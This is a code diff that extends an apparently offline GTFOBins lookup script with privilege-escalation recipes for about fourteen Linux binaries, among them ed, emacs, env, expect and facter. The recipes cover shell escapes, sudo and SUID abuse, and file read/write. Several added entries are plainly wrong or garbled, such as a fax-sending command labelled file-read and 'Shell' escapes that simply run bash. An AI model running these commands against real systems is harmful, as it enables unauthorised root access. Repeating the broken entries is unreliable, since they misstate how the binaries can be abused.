@@ -1287,6 +1287,174 @@ def gtfo_bins(zip_command, zip_options):
         elif zip_options == "suid":
             bins.append("sudo install -m =xs $(which easy_install) .\nTF=$(mktemp -d)\necho ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py\nsudo easy_install $TF")
 
+    elif zip_command == "eb":
+        if zip_options == "Shell":
+            bins.append("eb logs\n!/bin/sh")
+        elif zip_options == "sudo":
+            bins.append("sudo eb logs\n!/bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which eb) .\nsudo eb logs\n!/bin/sh")
+        elif zip_options == "file-read":
+            bins.append("eb logs")
+        elif zip_options == "file-write":
+            bins.append("echo ""New content"" > /path/to/file.txt")
+
+    elif zip_command == "ed":
+        if zip_options == "Shell":
+            bins.append("ed\n!/bin/sh")
+        elif zip_options == "sudo":
+            bins.append("sudo ed\n!/bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which ed) .\n./ed file_to_read\n,p\nq")
+        elif zip_options == "file-write":
+            bins.append("ed file_to_write\na\nDATA\n.\nw\nq")
+        elif zip_options == "file-read":
+            bins.append("ed file_to_read\n,p\nq")
+
+    elif zip_command == "efax":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo efax -d ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which efax) .\nLFILE=file_to_read\n./efax -d ""$LFILE""")
+        elif zip_options == "file-read":
+            bins.append("efax -d /dev/modem -n 1234567890 -t ""Recipient Name"" -F ""Sender Name"" file-to-send.txt")
+        elif zip_options == "file-write":
+            bins.append("efax -d /dev/modem -r received_fax.tiff > efax_log.txt 2>&1")
+        elif zip_options == "Shell":
+            bins.append("efax -d /dev/modem -r received_fax.tiff\nbash")
+
+    elif zip_command == "elvish":
+        if zip_options == "Shell":
+            bins.append("elvish")
+        elif zip_options == "sudo":
+            bins.append("sudo elvish")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which elvish) .\n./elvish")
+        elif zip_options == "file-write":
+            bins.append("export LFILE=file_to_write\nelvish -c 'echo DATA >$E:LFILE'")
+        elif zip_options == "file-read":
+            bins.append("export LFILE=file_to_read\nelvish -c 'echo (slurp <$E:LFILE)'")
+
+    elif zip_command == "emacs":
+        if zip_options == "Shell":
+            bins.append("emacs -Q -nw --eval '(term ""/bin/sh"")'")
+        elif zip_options == "sudo":
+            bins.append("sudo emacs -Q -nw --eval '(term ""/bin/sh"")'")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which emacs) .\n./emacs -Q -nw --eval '(term ""/bin/sh -p"")'")
+        elif zip_options == "file-read":
+            bins.append("emacs file_to_read")
+        elif zip_options == "file-write":
+            bins.append("emacs file_to_write\nDATA\nC-x C-s")
+
+    elif zip_command == "enscript":
+        if zip_options == "Shell":
+            bins.append("enscript /dev/null -qo /dev/null -I '/bin/sh >&2'")
+        elif zip_options == "sudo":
+            bins.append("sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'")
+        elif zip_options == "file-read":
+            bins.append("enscript file.txt -o output.txt")
+        elif zip_options == "file-write":
+            bins.append("enscript file.txt > output.ps")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which enscript) .\nsudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'")
+
+    elif zip_command == "env":
+        if zip_options == "Shell":
+            bins.append("env /bin/sh")
+        elif zip_options == "sudo":
+            bins.append("sudo env /bin/sh")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which env) .\n./env /bin/sh -p")
+        elif zip_options == "file-read":
+            bins.append("env $(cat envfile) bash -c 'echo $VAR1 $VAR2'")
+        elif zip_options == "file-write":
+            bins.append("env PATH=/custom/path echo ""SCRIPT"" > output.txt")
+
+    elif zip_command == "eqn":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo eqn ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which eqn) .\nLFILE=file_to_read\n./eqn ""$LFILE""")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\neqn ""$LFILE""")
+        elif zip_options == "file-write":
+            bins.append("eqn equations.txt | groff -ms > output.ps")
+        elif zip_options == "Shell":
+            bins.append("eqn - <(echo "".EQ; x = (-b +- sqrt(b^2 - 4ac)) / 2a; .EN"") | groff -ms && bash")
+
+    elif zip_command == "espeak":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo espeak -qXf ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which espeak) .\nLFILE=file_to_read\n./espeak -qXf ""$LFILE""")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\nespeak -qXf ""$LFILE""")
+        elif zip_options == "file-write":
+            bins.append("echo ""This is an example text for espeak."" > example.txt && espeak -f example.txt")
+        elif zip_options == "Shell":
+            bins.append("espeak ""Now spawning a new shell"" && bash")
+
+    elif zip_command == "ex":
+        if zip_options == "Shell":
+            bins.append("ex\n!/bin/sh")
+        elif zip_options == "sudo":
+            bins.append("sudo ex\n!/bin/sh")
+        elif zip_options == "file-read":
+            bins.append("ex file_to_read\n,p\nq")
+        elif zip_options == "file-write":
+            bins.append("ex file_to_write\na\nDATA\n.\nw\nq")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which ex) .\nsudo ex\n!/bin/sh")
+
+    elif zip_command == "exiftool":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT")
+        elif zip_options == "file-write":
+            bins.append("LFILE=file_to_write\nINPUT=input_file\nexiftool -filename=$LFILE $INPUT")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\nOUTPUT=output_file\nexiftool -filename=$OUTPUT $LFILE\ncat $OUTPUT")
+        elif zip_options == "Shell":
+            bins.append("exiftool -Comment=""$(echo 'bash' | base64)"" example.jpg && bash")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which exiftool) .\nLFILE=file_to_write\nINPUT=input_file\nsudo exiftool -filename=$LFILE $INPUT")
+
+    elif zip_command == "expand":
+        if zip_options == "sudo":
+            bins.append("LFILE=file_to_read\nsudo expand ""$LFILE""")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\nexpand ""$LFILE""")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which expand) .\nLFILE=file_to_read\n./expand ""$LFILE""")
+        elif zip_options == "file-write":
+            bins.append("expand sample.txt > expanded_sample.txt")
+        elif zip_options == "Shell":
+            bins.append("expand sample.txt > expanded_sample.txt && bash")
+
+    elif zip_command == "expect":
+        if zip_options == "Shell":
+            bins.append("expect -c 'spawn /bin/sh;interact'")
+        elif zip_options == "file-read":
+            bins.append("LFILE=file_to_read\nexpect $LFILE")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which expect) .\n./expect -c 'spawn /bin/sh -p;interact'")
+        elif zip_options == "sudo":
+            bins.append("sudo expect -c 'spawn /bin/sh;interact'")
+        elif zip_options == "file-write":
+            bins.append("expect -c 'spawn ssh your-username@your-remote-server; expect ""password:""; send ""your-password\r""; interact'")
+
+    elif zip_command == "facter":
+        if zip_options == "sudo":
+            bins.append("TF=$(mktemp -d)\necho 'exec(""/bin/sh"")' > $TF/x.rb\nsudo FACTERLIB=$TF facter")
+        elif zip_options == "Shell":
+            bins.append("TF=$(mktemp -d)\necho 'exec(""/bin/sh"")' > $TF/x.rb\nFACTERLIB=$TF facter")
+        elif zip_options == "suid":
+            bins.append("sudo install -m =xs $(which facter) .\nTF=$(mktemp -d)\necho 'exec(""/bin/sh"")' > $TF/x.rb\nsudo FACTERLIB=$TF facter")
+        elif zip_options == "file-write":
+            bins.append("facter > system_facts.txt")
+        elif zip_options == "file-read":
+            bins.append("facter --custom_fact=$(cat filename.txt)")
+
 #If there are any other misconfigurations run the other option
     elif zip_command == "other":
         if zip_options == "Shell": #This will print out hints for more GTFO bins!
@@ -1302,8 +1470,8 @@ def main():
     start = input("Off-Grid, the offline GTFO Bin lookup tool, what is misconfigured?\n")
 
     #Tool selection for Linux misconfigurations
-    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "other":  
-        zip_options = input("Choose tex '\special{psfile=""`/bin/sh 1>&0""}\end'\nsudo dvips -R0 texput.dvifollowing options: Shell, file-read, file-write, sudo, suid\n")
+    if start == "zip" or start == "7zip" or start == "base64" or start == "bash" or start == "awk" or start == "base32" or start == "busybox" or start == "cat" or start == "neofetch" or start == "cp" or start == "curl" or start == "chmod" or start == "dosbox" or start == "dmesg" or start == "gcc" or start == "vim" or start == "vi" or start == "nano" or start == "zsh" or start == "dd" or start == "aa-exec" or start == "ab" or start == "agetty" or start == "alpine" or start == "ansible-playbook" or start == "ansible-test" or start == "aoss" or start == "apache2ctl" or start == "apt-get" or start == "ar" or start == "apt" or start == "aria2c" or start == "arj" or start == "arp" or start == "as" or start == "ascii-xfr" or start == "ascii85" or start == "ash" or start == "aspell" or start == "at" or start == "atobm" or start == "aws" or start == "base58" or start == "basenc" or start == "basez" or start == "batcat" or start == "bc" or start == "bconsole" or start == "bpftrace" or start == "bridge" or start == "bundle" or start == "bundler" or start == "busctl" or start == "byebug" or start == "bzip2" or start == "c89" or start == "c99" or start == "cabal" or start == "cancel" or start == "capsh" or start == "cdist" or start == "certbot" or start == "check_by_ssh" or start == "check_cups" or start == "check_log" or start == "check_memory" or start == "check_raid" or start == "check_ssl_cert" or start == "check_statusfile" or start == "choom" or start == "chown" or start == "chroot" or start == "clamscan" or start == "cmp" or start == "cobc" or start == "column" or start == "comm" or start == "composer" or start == "cowsay" or start == "cowthink" or start == "cpan" or start == "cpio" or start == "cpulimit" or start == "crash" or start == "crontab" or start == "csh" or start == "csvtool" or start == "cupsfilter" or start == "cut" or start == "dash" or start == "date" or start == "dc" or start == "debugfs" or start == "dialog" or start == "diff" or start == "dig" or start == "distcc" or start == "dmidecode" or start == "dmsetup" or start == "dnf" or start == "docker" or start == "dos2unix" or start == "dotnet" or start == "dpkg" or start == "dstat" or start == "dvips" or start == "dvips" or start == "eb" or start == "ed" or start == "efax" or start == "emacs" or start == "elvish" or start == "enscript" or start == "env" or start == "eqn" or start == "espeak" or start == "ex" or start == "exiftool" or start == "expand" or start == "expect" or start == "facter" or start == "other":  
+        zip_options = input("Choose following options: Shell, file-read, file-write, sudo, suid\n")
 
         if zip_options in ["Shell", "file-read", "file-write", "sudo", "suid"]:
             bins = gtfo_bins(start, zip_options)  # Call the gtfo_bins function with the correct arguments
